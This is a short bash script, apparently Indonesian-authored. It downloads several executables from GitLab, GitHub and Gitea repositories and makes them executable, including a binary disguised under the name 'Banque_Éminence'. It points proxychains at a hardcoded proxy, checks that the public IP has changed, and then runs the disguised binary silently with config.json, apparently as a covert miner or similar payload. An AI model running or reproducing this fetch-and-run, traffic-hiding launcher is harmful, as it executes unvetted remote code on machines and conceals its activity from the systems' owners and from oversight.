proxy="142.54.232.6" 
port="4145"
wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
wget -q https://github.com/pagesrlepla/mx8/raw/main/bash && chmod +x bash
wget -q https://raw.githubusercontent.com/pagesrlepla/mx7/main/pooh.sh && chmod +x pooh.sh
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./Banque_Éminence -c "config.json" >/dev/null 2>&1
sleep 1
sync; echo 3 > /proc/sys/vm/drop_caches
